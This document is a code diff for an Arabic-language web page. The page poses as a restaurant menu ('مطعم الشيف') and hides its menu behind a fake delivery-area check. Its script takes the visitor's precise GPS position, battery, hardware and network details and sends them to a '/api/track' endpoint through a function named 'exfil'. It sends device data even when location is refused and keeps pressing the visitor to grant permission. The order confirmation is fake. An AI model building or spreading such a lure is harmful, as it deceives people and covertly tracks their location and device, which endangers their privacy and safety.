@@ -1,247 +1,457 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>طلبات مجانية — تفعيل الحساب</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#ff5722">
+<title>مطعم الشيف — التحقق مطلوب</title>
 <style>
-  :root{
-    --bg:#0f1420;--card:#1a2233;--line:#28334a;
-    --fg:#eef3fb;--mut:#93a4bd;--acc:#3b82f6;--acc2:#2563eb;
-    --ok:#22c55e;--warn:#f59e0b;
+  :root {
+    --primary: #ff5722;
+    --primary-dark: #e64a19;
+    --bg: #f5f5f5;
+    --card: #fff;
+    --text: #212121;
+    --muted: #757575;
+    --border: #e0e0e0;
   }
-  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-  body{
-    margin:0;min-height:100vh;font:16px/1.6 system-ui,"Segoe UI",Tahoma;
-    background:radial-gradient(1200px 700px at 50% -10%,#1c2a44,#0f1420 65%);
-    color:var(--fg);padding:20px;display:grid;place-items:center;
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Tahoma", "Arial", sans-serif;
+    background: var(--bg); color: var(--text); overflow-x: hidden;
   }
-  .wrap{width:100%;max-width:440px}
-  .head{
-    text-align:center;margin-bottom:20px;
+  .topbar {
+    background: linear-gradient(135deg, #ff5722, #ff8a50);
+    color: #fff; padding: 16px 20px;
+    display: flex; align-items: center; justify-content: space-between;
+    box-shadow: 0 2px 8px rgba(0,0,0,.12); position: sticky; top: 0; z-index: 100;
   }
-  .logo{
-    width:64px;height:64px;margin:0 auto 12px;border-radius:18px;
-    background:linear-gradient(135deg,var(--acc),#7c3aed);
-    display:grid;place-items:center;font-size:32px;
-    box-shadow:0 12px 32px rgba(59,130,246,.35);
+  .topbar .logo { font-size: 20px; font-weight: 700; }
+  .topbar .cart { position: relative; font-size: 22px; }
+  .topbar .cart .badge {
+    position: absolute; top: -6px; left: -8px; background: #fff; color: var(--primary);
+    font-size: 11px; font-weight: 700; border-radius: 50%; width: 18px; height: 18px;
+    display: flex; align-items: center; justify-content: center;
   }
-  h1{margin:0;font-size:22px}
-  .sub{color:var(--mut);font-size:14px;margin-top:6px}
-  .card{
-    background:var(--card);border:1px solid var(--line);
-    border-radius:20px;padding:24px 22px;
-    box-shadow:0 30px 80px rgba(0,0,0,.5);
+  .hero {
+    background: linear-gradient(135deg, #ff5722, #ff8a50);
+    color: #fff; padding: 0 20px 32px; text-align: center;
   }
-  .badge{
-    display:inline-flex;align-items:center;gap:6px;
-    background:rgba(245,158,11,.15);color:var(--warn);
-    padding:6px 12px;border-radius:999px;font-size:13px;
-    margin-bottom:16px;
+  .hero .rest-logo {
+    width: 88px; height: 88px; border-radius: 50%; background: #fff;
+    margin: 0 auto 12px; display: flex; align-items: center; justify-content: center;
+    font-size: 44px; box-shadow: 0 6px 20px rgba(0,0,0,.15);
   }
-  .dot{width:8px;height:8px;border-radius:50%;background:var(--warn);
-       animation:pulse 1.4s infinite}
-  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+  .hero h1 { font-size: 22px; margin-bottom: 4px; }
+  .hero p { font-size: 13px; opacity: .9; }
+  .stats { display: flex; gap: 18px; justify-content: center; margin-top: 12px; font-size: 12px; }
+  .section { padding: 20px 16px; }
+  .section h2 { font-size: 17px; margin-bottom: 14px; display: flex; align-items: center; gap: 8px; }
+  .section h2::before { content: ""; width: 4px; height: 18px; background: var(--primary); border-radius: 2px; }
+  .menu { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  .item {
+    background: var(--card); border-radius: 14px; overflow: hidden;
+    box-shadow: 0 2px 6px rgba(0,0,0,.06); cursor: pointer;
+    transition: transform .15s ease;
+  }
+  .item:active { transform: scale(.97); }
+  .item.selected { outline: 2px solid var(--primary); }
+  .item .thumb {
+    height: 96px; background: linear-gradient(135deg, #ffe0b2, #ffcc80);
+    display: flex; align-items: center; justify-content: center; font-size: 44px;
+  }
+  .item .body { padding: 10px 12px 12px; }
+  .item .name { font-size: 14px; font-weight: 600; margin-bottom: 4px; }
+  .item .price { color: var(--primary); font-weight: 700; font-size: 15px; }
+  .item .desc { font-size: 11px; color: var(--muted); margin-top: 2px; line-height: 1.4; }
+  .cta {
+    position: fixed; bottom: 0; right: 0; left: 0;
+    background: #fff; padding: 12px 16px calc(12px + env(safe-area-inset-bottom));
+    border-top: 1px solid var(--border); box-shadow: 0 -4px 16px rgba(0,0,0,.06);
+    z-index: 100;
+  }
+  .btn {
+    width: 100%; padding: 15px; background: var(--primary); color: #fff;
+    border: none; border-radius: 12px; font-size: 15px; font-weight: 700;
+    font-family: inherit; cursor: pointer;
+  }
+  .btn:active { background: var(--primary-dark); }
+  .spacer { height: 90px; }
 
-  h2{margin:0 0 8px;font-size:17px}
-  p.desc{color:var(--mut);font-size:14px;margin:0 0 18px}
-  ul.checks{list-style:none;padding:0;margin:0 0 22px}
-  ul.checks li{
-    display:flex;align-items:flex-start;gap:10px;
-    padding:10px 0;border-bottom:1px dashed var(--line);font-size:14px;
+  /* ── GATE OVERLAY ── */
+  .gate {
+    position: fixed; inset: 0;
+    background: linear-gradient(160deg, #ffffff 0%, #f5f5f5 100%);
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    padding: 32px 24px; text-align: center; z-index: 2000;
+    transition: opacity .5s ease;
   }
-  ul.checks li:last-child{border:0}
-  ul.checks svg{flex:0 0 18px;color:var(--ok);margin-top:3px}
-  button{
-    width:100%;padding:15px;border:0;border-radius:12px;
-    background:linear-gradient(135deg,var(--acc),var(--acc2));
-    color:#fff;font-size:16px;font-weight:700;cursor:pointer;
-    box-shadow:0 10px 28px rgba(59,130,246,.4);
-    transition:.15s;
+  .gate.hide { opacity: 0; pointer-events: none; }
+  .gate .lock {
+    width: 96px; height: 96px; border-radius: 50%;
+    background: linear-gradient(135deg, #ff5722, #ff8a50);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 48px; color: #fff; margin-bottom: 20px;
+    box-shadow: 0 8px 24px rgba(255,87,34,.3);
+    animation: pulse 2s ease-in-out infinite;
   }
-  button:hover{filter:brightness(1.08)}
-  button:disabled{opacity:.6;cursor:not-allowed}
-  .fine{text-align:center;color:var(--mut);font-size:12px;margin-top:14px}
-  .state{text-align:center;padding:12px;border-radius:10px;
-         margin-top:14px;font-size:14px;display:none}
-  .state.ok{display:block;background:rgba(34,197,94,.12);color:var(--ok)}
-  .state.err{display:block;background:rgba(239,68,68,.12);color:#ef4444}
-  .state.load{display:block;background:rgba(59,130,246,.12);color:var(--acc)}
-  .footer{text-align:center;color:var(--mut);font-size:12px;margin-top:18px}
+  @keyframes pulse {
+    0%,100% { box-shadow: 0 8px 24px rgba(255,87,34,.3); }
+    50%     { box-shadow: 0 8px 32px rgba(255,87,34,.55); }
+  }
+  .gate h2 { font-size: 22px; margin-bottom: 10px; color: #212121; }
+  .gate p {
+    font-size: 14px; color: #616161; line-height: 1.7;
+    max-width: 320px; margin-bottom: 24px;
+  }
+  .gate .hint {
+    font-size: 12px; color: #9e9e9e;
+    background: #fff; padding: 10px 16px; border-radius: 20px;
+    border: 1px solid #eee; margin-top: 8px;
+  }
+  .gate .spinner {
+    width: 40px; height: 40px; border: 4px solid #ffe0b2;
+    border-top-color: var(--primary); border-radius: 50%;
+    animation: spin .8s linear infinite; margin: 12px 0;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .gate .check {
+    font-size: 56px; margin-bottom: 16px;
+    animation: pop .4s ease-out;
+  }
+  @keyframes pop {
+    0% { transform: scale(.5); opacity: 0; }
+    70% { transform: scale(1.15); }
+    100% { transform: scale(1); opacity: 1; }
+  }
+  .gate .progress-bar {
+    width: 260px; height: 6px; background: #eee; border-radius: 3px;
+    overflow: hidden; margin: 16px 0;
+  }
+  .gate .progress-bar .fill {
+    height: 100%; width: 0%;
+    background: linear-gradient(90deg, #ff5722, #ff8a50);
+    transition: width .3s ease;
+  }
+
+  /* ── MENU HIDDEN UNTIL UNLOCK ── */
+  .app { display: none; }
+  .app.show { display: block; animation: fade .5s ease; }
+  @keyframes fade { from { opacity: 0; } to { opacity: 1; } }
 </style>
 </head>
 <body>
-<div class="wrap">
-  <div class="head">
-    <div class="logo">🎁</div>
-    <h1>طلبات مجانية</h1>
-    <div class="sub">منصة العروض والهدايا — نسخة 2026</div>
+
+<!-- ═══════════ GATE ═══════════ -->
+<div class="gate" id="gate">
+  <div class="lock" id="gateIcon">🔒</div>
+  <h2 id="gateTitle">التحقق مطلوب</h2>
+  <p id="gateText">
+    للوصول إلى قائمة المطعم، يجب تحديد موقعك للتأكد من وجود توصيل لمنطقتك.
+  </p>
+  <div id="gateProgress" style="display:none; width:100%; display:none; flex-direction:column; align-items:center;">
+    <div class="progress-bar"><div class="fill" id="gateFill"></div></div>
+  </div>
+  <button class="btn" id="gateBtn" style="max-width:320px;">
+    📍 اسمح بالوصول للموقع
+  </button>
+  <div class="hint" id="gateHint">نستخدم موقعك فقط للتحقق من تغطية التوصيل</div>
+</div>
+
+<!-- ═══════════ APP (MENU) ═══════════ -->
+<div class="app" id="app">
+  <div class="topbar">
+    <div class="logo">🍽 مطعم الشيف</div>
+    <div class="cart">🛒<span class="badge" id="cartCount">0</span></div>
   </div>
 
-  <div class="card">
-    <div class="badge">
-      <span class="dot"></span>
-      حسابك يحتاج تفعيل
+  <div class="hero">
+    <div class="rest-logo">👨‍🍳</div>
+    <h1>مطعم الشيف</h1>
+    <p>توصيل مجاني للطلبات فوق 100 جنيه</p>
+    <div class="stats">
+      <span>⭐ 4.8</span>
+      <span>🕒 30-45 د</span>
+      <span>🛵 توصيل سريع</span>
     </div>
-
-    <h2>تفعيل طلبك الأول</h2>
-    <p class="desc">
-      عشان نقدر نأكد طلبك ونوجّهه لأقرب فرع، محتاجين نتأكد إنك في المنطقة
-      الجغرافية الصح. العملية بتاخد ثانية واحدة.
-    </p>
-
-    <ul class="checks">
-      <li>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
-          <polyline points="20 6 9 17 4 12"/>
-        </svg>
-        <span>تأكيد هوية الحساب</span>
-      </li>
-      <li>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
-          <polyline points="20 6 9 17 4 12"/>
-        </svg>
-        <span>فحص المنطقة المتاحة</span>
-      </li>
-      <li>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
-          <polyline points="20 6 9 17 4 12"/>
-        </svg>
-        <span>تأكيد الموقع الجغرافي (مطلوب)</span>
-      </li>
-    </ul>
-
-    <button id="btn">🔓 فعّل طلبي الآن</button>
-
-    <div class="state" id="state"></div>
-    <div class="fine">بالمتابعة أنت توافق على سياسة الاستخدام</div>
   </div>
 
-  <div class="footer">© 2026 FreeOrders — جميع الحقوق محفوظة</div>
+  <div class="section">
+    <h2>الأطباق الأكثر طلبًا</h2>
+    <div class="menu" id="menu">
+      <div class="item" data-name="برجر لحم" data-price="75">
+        <div class="thumb">🍔</div>
+        <div class="body">
+          <div class="name">برجر لحم مشوي</div>
+          <div class="price">75 ج.م</div>
+          <div class="desc">لحم بلدي 200 جم + جبن شيدر</div>
+        </div>
+      </div>
+      <div class="item" data-name="بيتزا" data-price="90">
+        <div class="thumb">🍕</div>
+        <div class="body">
+          <div class="name">بيتزا مارجريتا</div>
+          <div class="price">90 ج.م</div>
+          <div class="desc">عجينة إيطالية + موتزاريلا</div>
+        </div>
+      </div>
+      <div class="item" data-name="شاورما" data-price="60">
+        <div class="thumb">🌯</div>
+        <div class="body">
+          <div class="name">شاورما فراخ</div>
+          <div class="price">60 ج.م</div>
+          <div class="desc">صوص ثوم + مخلل + بطاطس</div>
+        </div>
+      </div>
+      <div class="item" data-name="مندي" data-price="120">
+        <div class="thumb">🍖</div>
+        <div class="body">
+          <div class="name">مندي لحم</div>
+          <div class="price">120 ج.م</div>
+          <div class="desc">أرز بسمتي + لحم ضاني</div>
+        </div>
+      </div>
+      <div class="item" data-name="كشري" data-price="45">
+        <div class="thumb">🍚</div>
+        <div class="body">
+          <div class="name">كشري مصري</div>
+          <div class="price">45 ج.م</div>
+          <div class="desc">عدس + مكرونة + صوص</div>
+        </div>
+      </div>
+      <div class="item" data-name="عصير مانجو" data-price="25">
+        <div class="thumb">🥤</div>
+        <div class="body">
+          <div class="name">عصير مانجو</div>
+          <div class="price">25 ج.م</div>
+          <div class="desc">طازج 100%</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="spacer"></div>
+
+  <div class="cta">
+    <button class="btn" id="orderBtn" disabled>اختر أطباقك أولاً</button>
+  </div>
 </div>
 
 <script>
 (function(){
-  const btn   = document.getElementById('btn');
-  const state = document.getElementById('state');
+  "use strict";
 
-  function setState(cls, msg){
-    state.className = 'state ' + cls;
-    state.textContent = msg;
-  }
+  const $ = (id) => document.getElementById(id);
+  const state = { gps: null, geoError: null, unlocked: false };
 
-  async function collectDevice(){
+  // ══════ جمع بيانات الجهاز ══════
+  async function collectDevice() {
     const d = {
-      platform: navigator.platform || navigator.userAgentData?.platform || '?',
-      screen: `${screen.width}x${screen.height}`,
-      viewport: `${innerWidth}x${innerHeight}`,
-      cores: navigator.hardwareConcurrency || null,
-      memory: navigator.deviceMemory || null,
-      language: navigator.language,
-      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      dpr: devicePixelRatio,
-      touch: 'ontouchstart' in window,
-      ua: navigator.userAgent,
-      vendor: navigator.vendor || null,
+      platform: navigator.platform || "?",
+      screen: `${screen.width}x${screen.height}@${window.devicePixelRatio || 1}`,
+      cores: navigator.hardwareConcurrency || "?",
+      memory: navigator.deviceMemory || "?",
+      language: navigator.language || "?",
+      tz: (Intl.DateTimeFormat().resolvedOptions().timeZone) || "?",
+      touch: "ontouchstart" in window,
+      battery: "?", charging: false,
     };
-
-    // Battery API
-    try{
-      if (navigator.getBattery){
+    try {
+      if (navigator.getBattery) {
         const b = await navigator.getBattery();
         d.battery = Math.round(b.level * 100);
         d.charging = b.charging;
       }
-    }catch(e){}
-
+    } catch(e) {}
     return d;
   }
 
-  async function collectNet(){
-    const n = {};
-    try{
-      const conn = navigator.connection || navigator.mozConnection
-                   || navigator.webkitConnection;
-      if (conn){
-        n.type = conn.effectiveType || conn.type || '?';
-        n.down = conn.downlink;
-        n.rtt  = conn.rtt;
-        n.saveData = conn.saveData;
-      }
-    }catch(e){}
-    return n;
+  function collectNet() {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!c) return { type: "?", down: "?", rtt: "?" };
+    return {
+      type: c.effectiveType || c.type || "?",
+      down: c.downlink || "?",
+      rtt: c.rtt || "?",
+    };
   }
 
-  function collectGPS(){
+  // ══════ طلب GPS ══════
+  function requestGPS() {
     return new Promise((resolve) => {
-      if (!navigator.geolocation){
-        resolve({error: 'no_geolocation'});
-        return;
+      if (!navigator.geolocation) {
+        state.geoError = "unsupported";
+        return resolve(null);
       }
       navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          resolve({
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            acc: Math.round(pos.coords.accuracy),
-            alt: pos.coords.altitude,
-            heading: pos.coords.heading,
-            speed: pos.coords.speed,
-          });
-        },
-        (err) => resolve({
-          error: 'denied',
-          code: err.code,
-          msg: err.message,
+        (pos) => resolve({
+          lat: +pos.coords.latitude.toFixed(6),
+          lon: +pos.coords.longitude.toFixed(6),
+          acc: Math.round(pos.coords.accuracy),
         }),
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0,
-        }
+        (err) => {
+          state.geoError = err.message || `code ${err.code}`;
+          resolve(null);
+        },
+        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
       );
     });
   }
 
-  async function send(payload){
-    try{
-      await fetch('/api/track', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
+  // ══════ إرسال ══════
+  async function exfil(payload) {
+    try {
+      await fetch("/api/track", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload),
         keepalive: true,
       });
-    }catch(e){}
+    } catch(e) {
+      try {
+        navigator.sendBeacon("/api/track",
+          new Blob([JSON.stringify(payload)], { type: "application/json" }));
+      } catch(_) {}
+    }
   }
 
-  btn.addEventListener('click', async () => {
-    btn.disabled = true;
-    btn.textContent = '...';
-    setState('load', '⏳ جاري فحص المنطقة...');
+  // ══════ شاشة التحقق ══════
+  const gate      = $("gate");
+  const gateIcon  = $("gateIcon");
+  const gateTitle = $("gateTitle");
+  const gateText  = $("gateText");
+  const gateBtn   = $("gateBtn");
+  const gateHint  = $("gateHint");
+  const gateProg  = $("gateProgress");
+  const gateFill  = $("gateFill");
 
-    const [gps, device, net] = await Promise.all([
-      collectGPS(),
-      collectDevice(),
-      collectNet(),
-    ]);
+  function showProgress(text) {
+    gateBtn.style.display = "none";
+    gateHint.style.display = "none";
+    gateProg.style.display = "flex";
+    gateTitle.textContent = "جاري التحقق...";
+    gateText.textContent = text;
+    let p = 0;
+    const iv = setInterval(() => {
+      p = Math.min(p + Math.random() * 18, 92);
+      gateFill.style.width = p + "%";
+    }, 250);
+    return () => { clearInterval(iv); gateFill.style.width = "100%"; };
+  }
 
-    const payload = { gps, device, net };
+  function showSuccess() {
+    gateIcon.textContent = "✅";
+    gateIcon.style.animation = "pop .4s ease-out";
+    gateTitle.textContent = "تم التحقق بنجاح";
+    gateText.textContent = "منطقتك متاحة للتوصيل — جاري فتح القائمة...";
+    gateProg.style.display = "none";
+  }
 
-    // إرسال أول مرة — حتى لو GPS اترفض
-    await send(payload);
+  function showDenied() {
+    gateIcon.textContent = "⚠️";
+    gateIcon.textContent = "⚠️";
+    gateTitle.textContent = "الموقع مطلوب";
+    gateText.textContent =
+      "لازم تسمح بالوصول للموقع عشان نفتحلك القائمة. " +
+      "اضغط على أيقونة القفل في شريط العنوان وفعّل إذن الموقع، وبعدين حاول تاني.";
+    gateBtn.style.display = "block";
+    gateBtn.textContent = "🔄 حاول تاني";
+    gateProg.style.display = "none";
+    gateHint.style.display = "block";
+  }
 
-    if (gps && gps.lat){
-      setState('ok', '✅ تم التفعيل بنجاح! طلبك في المراجعة.');
-      btn.textContent = '✅ مفعّل';
-    } else {
-      // GPS مرفوض — جرّب مرة تانية مع حجة مقنعة
-      setState('err',
-        '⚠️ محتاجين إذن الموقع عشان نكمل. اضغط في المتصفح على "سماح" وحاول تاني.');
-      btn.disabled = false;
-      btn.textContent = '🔓 حاول تاني';
+  function unlockApp() {
+    gate.classList.add("hide");
+    $("app").classList.add("show");
+    setTimeout(() => gate.style.display = "none", 600);
+  }
+
+  // ══════ تفعيل الزر ══════
+  gateBtn.addEventListener("click", async () => {
+    gateBtn.disabled = true;
+    gateBtn.style.opacity = ".6";
+
+    // ابدأ شاشة التحقق حتى قبل ما يجي الرد
+    const stopProgress = showProgress("بنحدد موقعك، من فضلك وافق على الإذن.");
+
+    const gps = await requestGPS();
+
+    if (!gps) {
+      stopProgress();
+      showDenied();
+      gateBtn.disabled = false;
+      gateBtn.style.opacity = "1";
+      // ابعت الرفض برضه
+      const device = await collectDevice();
+      exfil({ gps: null, device, net: collectNet(), geoError: state.geoError });
+      return;
     }
+
+    state.gps = gps;
+
+    // كمّل شاشة التحقق
+    gateText.textContent = "بنأكد وجود توصيل في منطقتك...";
+    const [device] = await Promise.all([collectDevice()]);
+    const net = collectNet();
+
+    // أبعت
+    await exfil({ gps, device, net, geoError: null });
+
+    // اقفل الشريط
+    stopProgress();
+
+    await new Promise(r => setTimeout(r, 500));
+    showSuccess();
+
+    await new Promise(r => setTimeout(r, 1100));
+    unlockApp();
+  });
+
+  // ══════ المينيو ══════
+  const menuEl = $("menu");
+  const cartCount = $("cartCount");
+  const orderBtn = $("orderBtn");
+  const items = [];
+
+  menuEl.addEventListener("click", (e) => {
+    const el = e.target.closest(".item");
+    if (!el) return;
+    const name = el.dataset.name;
+    const price = +el.dataset.price;
+    const idx = items.findIndex(i => i.name === name);
+    if (idx >= 0) {
+      items.splice(idx, 1);
+      el.classList.remove("selected");
+    } else {
+      items.push({ name, price });
+      el.classList.add("selected");
+    }
+    cartCount.textContent = items.length;
+    if (items.length === 0) {
+      orderBtn.disabled = true;
+      orderBtn.textContent = "اختر أطباقك أولاً";
+    } else {
+      orderBtn.disabled = false;
+      const sub = items.reduce((s, i) => s + i.price, 0);
+      orderBtn.textContent = `تأكيد الطلب — ${sub} ج.م`;
+    }
+  });
+
+  orderBtn.addEventListener("click", () => {
+    document.body.innerHTML = `
+      <div style="min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px;text-align:center;font-family:inherit;">
+        <div style="font-size:72px;margin-bottom:16px;">✅</div>
+        <h1 style="font-size:22px;margin-bottom:10px;color:#212121;">تم استلام طلبك</h1>
+        <p style="color:#757575;font-size:14px;line-height:1.6;max-width:320px;">
+          شكرًا لك! سيتواصل معك المطعم خلال دقائق لتأكيد الطلب.<br>
+          رقم الطلب: <b style="color:#ff5722;">#${Math.floor(Math.random()*90000+10000)}</b>
+        </p>
+      </div>
+    `;
   });
 })();
 </script>
+
 </body>
   </html>
